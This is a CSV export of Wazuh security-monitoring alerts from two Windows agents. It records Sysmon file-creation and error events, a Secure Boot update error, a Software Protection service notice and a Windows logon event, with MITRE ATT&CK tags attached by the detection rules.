wazuh-alerts-4.x-2024.12.22,JUqc7ZMBNimV4ECvU4Gi,1,1,192.168.117.139,window-agent3,3,Maryam, , ,11, ,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-22 09:04:20.786
ProcessGuid: {15959494-d612-6767-6601-000000001100}
ProcessId: 5744
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_pxmqhzai.vrn.ps1
CreationUtcTime: 2024-12-22 09:04:20.786
User: DESKTOP-QGB4EQH\mari""",2,2024-12-22T09:04:20.8003372Z,221831,4236,DESKTOP-QGB4EQH,11,2876,INFORMATION,Microsoft-Windows-Sysmon,1,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 22, 2024 @ 09:04:21.341",EventChannel,1734858262,"Dec 22, 2024 @ 09:04:21.341", , , , , , , , , , , , , , ,5744, , , , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, ,{15959494-d612-6767-6601-000000001100},04:20.8, , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , ,"technique_id=T1059.001,technique_name=PowerShell", , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_pxmqhzai.vrn.ps1,04:20.8, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,Nkqc7ZMBNimV4ECv6IEn,1,1,192.168.117.139,window-agent3,3,Maryam, , ,255, ,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},2,Microsoft-Windows-Sysmon/Operational,0,"""Error report:
UtcTime: 2024-12-22 09:05:02.224
ID: IMAGE_LOAD
Description: Failed to find process image name""",3,2024-12-22T09:05:02.2292518Z,222187,4236,DESKTOP-QGB4EQH,255,2876,ERROR,Microsoft-Windows-Sysmon,1,FALSE,5,Windows Sysmon error event,"[""windows"",""sysmon"",""system_error""]",61602,windows_eventchannel,log,"Dec 22, 2024 @ 09:05:02.396",EventChannel,1734858303,"Dec 22, 2024 @ 09:05:02.396", , , , , , , , , , , , , , , , , , , , , , , , , , ,"[""IV_35.7.d""]", , , ,"[""4.3""]", , , ,05:02.2, , , , , , ,Failed to find process image name, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,IMAGE_LOAD, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,N0qc7ZMBNimV4ECv6IEn,1,1,192.168.117.139,window-agent3,3,Maryam, , ,255, ,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},2,Microsoft-Windows-Sysmon/Operational,0,"""Error report:
UtcTime: 2024-12-22 09:05:02.567
ID: IMAGE_LOAD
Description: Failed to find process image name""",3,2024-12-22T09:05:02.5776504Z,222191,4236,DESKTOP-QGB4EQH,255,2876,ERROR,Microsoft-Windows-Sysmon,2,FALSE,5,Windows Sysmon error event,"[""windows"",""sysmon"",""system_error""]",61602,windows_eventchannel,log,"Dec 22, 2024 @ 09:05:02.460",EventChannel,1734858303,"Dec 22, 2024 @ 09:05:02.460", , , , , , , , , , , , , , , , , , , , , , , , , , ,"[""IV_35.7.d""]", , , ,"[""4.3""]", , , ,05:02.6, , , , , , ,Failed to find process image name, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,IMAGE_LOAD, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,PUqd7ZMBNimV4ECvWYFq,1,1,192.168.117.129,agent1,4,Maryam, , ,1796, ,0x8000000000000000,{7d5387b0-cbe0-11da-a94d-0800200c9a66},2,System,0,"""The Secure Boot update failed to update a Secure Boot variable with error Secure Boot is not enabled on this machine.. For more information, please see https://go.microsoft.com/fwlink/?linkid=2169931""",0,2024-12-22T09:05:28.8442317Z,2154,10652,DESKTOP-B37GATP,0,10372,ERROR,Microsoft-Windows-TPM-WMI,4,FALSE,5,Windows System error event,"[""windows"",""windows_system"",""system_error""]",61102,windows_eventchannel,log,"Dec 22, 2024 @ 09:05:30.113",EventChannel,1734858331,"Dec 22, 2024 @ 09:05:30.113", , , , , , , , , , , , , , , , , , , , , , , , , , ,"[""IV_35.7.d""]", , , ,"[""4.3""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,-2147020471, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,JEqc7ZMBNimV4ECvGYEM,1,1,192.168.117.129,agent1,4,Maryam,"2024-12-23T09:02:06Z, RulesEngine", ,16384,Software Protection Platform Service,0x80000000000000,{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156},4,Application,0,"""Successfully scheduled Software Protection service for re-start at 2024-12-23T09:02:06Z. Reason: RulesEngine.""",0,2024-12-22T09:04:06.4847591Z,3698,0,DESKTOP-B37GATP,0,0,INFORMATION,Microsoft-Windows-Security-SPP,4,FALSE,3,Software protection service scheduled successfully.,"[""windows"",""windows_application""]",60642,windows_eventchannel,log,"Dec 22, 2024 @ 09:04:06.723",EventChannel,1734858247,"Dec 22, 2024 @ 09:04:06.723", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,qkql7ZMBNimV4ECvAoGp,1,1,192.168.117.139,window-agent3,3,Maryam, , ,4624, ,0x8020000000000000,{54849625-5478-4994-a5ba-3e3b0328c30d},0,Security,0,"""An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		DESKTOP-QGB4EQH$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		2
	Restricted Admin Mode:	-
	Virtual Account:		Yes
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-90-0-1
	Account Name:		DWM-1
	Account Domain:		Window Manager
	Logon ID:		0xA74B56
	Linked Logon ID:		0xA74C5A
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x26c
	Process Name:		C:\Windows\System32\winlogon.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.""",2,2024-12-22T09:13:51.4469047Z,21365,5936,DESKTOP-QGB4EQH,12544,684,AUDIT_SUCCESS,Microsoft-Windows-Security-Auditing,39,FALSE,3,Windows logon success.,"[""windows"",""windows_security"",""authentication_success""]",60106,windows_eventchannel,log,"Dec 22, 2024 @ 09:13:52.073",EventChannel,1734858832,"Dec 22, 2024 @ 09:13:52.073",0x3e7,WORKGROUP,0xa74c5a,%%1833, ,Negotiate, ,0xa74b56,Advapi,{00000000-0000-0000-0000-000000000000},DWM-1,0,%%1842,S-1-5-18,0x26c,C:\\Windows\\System32\\winlogon.exe, ,Window Manager,S-1-5-90-0-1,%%1842,2,DESKTOP-QGB4EQH$,"[""164.312.b""]","[""10.2.5""]","[""CC6.8"",""CC7.2"",""CC7.3""]","[""AC.7"",""AU.14""]","[""IV_32.2""]","[""Valid Accounts""]","[""T1078""]","[""Defense Evasion"",""Persistence"",""Privilege Escalation"",""Initial Access""]","[""7.1"",""7.2""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.22,rUql7ZMBNimV4ECvBoGW,1,1,192.168.117.139,window-agent3,3,Maryam, , ,11, ,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-22 09:13:53.593
ProcessGuid: {15959494-d84f-6767-f102-000000001100}
ProcessId: 16916
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_0qbq2res.nuv.ps1
CreationUtcTime: 2024-12-22 09:13:53.593
User: DESKTOP-QGB4EQH\mari""",2,2024-12-22T09:13:53.6867190Z,224463,4236,DESKTOP-QGB4EQH,11,2876,INFORMATION,Microsoft-Windows-Sysmon,19,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 22, 2024 @ 09:13:53.600",EventChannel,1734858833,"Dec 22, 2024 @ 09:13:53.600", , , , , , , , , , , , , , ,16916, , , , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, ,{15959494-d84f-6767-f102-000000001100},13:53.6, , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , ,"technique_id=T1059.001,technique_name=PowerShell", , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_0qbq2res.nuv.ps1,13:53.6, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
